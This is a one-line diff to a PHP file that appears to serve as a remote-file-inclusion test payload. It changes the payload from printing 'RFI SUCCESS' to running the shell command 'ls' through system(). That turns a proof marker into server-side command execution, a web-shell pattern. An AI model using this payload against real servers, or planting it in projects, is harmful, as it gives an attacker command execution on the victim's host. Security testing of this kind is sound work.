@@ -1,1 +1,1 @@
-<?php echo "RFI SUCCESS"; ?>
+<?php system("ls"); ?>
